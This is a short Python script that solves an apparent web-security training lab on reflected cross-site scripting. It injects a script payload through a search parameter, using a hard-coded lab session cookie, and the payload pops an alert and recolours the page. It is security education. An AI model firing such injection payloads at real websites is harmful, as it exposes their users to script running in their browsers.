# Reflected XSS into HTML context with nothing encoded

import requests

url = "https://0aa00099039f72d7c02d68290067000c.web-security-academy.net/"

cookies = dict(session="amDckeAvTQphB6EMs7l5zGsQz5WN7CFp")

PAYLOAD = """<script>alert(document.domain);document.querySelector(".maincontainer").style.backgroundColor = "blue"
</script>"""

params = {
	"search": PAYLOAD
}

r = requests.get(url, params=params, cookies=cookies)

print(r.url)